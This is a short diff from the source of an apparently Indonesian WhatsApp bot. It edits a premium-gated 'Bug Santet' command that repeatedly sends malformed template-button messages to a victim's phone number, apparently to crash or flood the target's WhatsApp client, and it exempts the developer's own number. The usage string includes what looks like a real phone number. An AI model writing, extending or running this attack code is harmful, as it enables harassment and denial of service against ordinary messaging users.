@@ -685,9 +685,8 @@ if (!isPremium && !isCreator) return reply(mess.premi)
 if (!q) return reply(`Contoh ${command} 6281297970769`)
 nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == isCreator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
-reply(`Bug Santet Telah Dikirim Ke: *${text}*`)
 async function bygbt(text) {
-XeonBotInc.sendMessage(nmn, {
+XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {
 text: '', 
 templateButtons: [
 { callButton: { displayText: `P`, phoneNumber: ``}},
@@ -699,6 +698,7 @@ templateButtons: [
 ]})
 }
 santedpc(bygbt, nmn, sleep)
+reply(`Bug Santet Telah Dikirim Ke: *${text}*`)
 }
 break
 case 'cbugpc': {
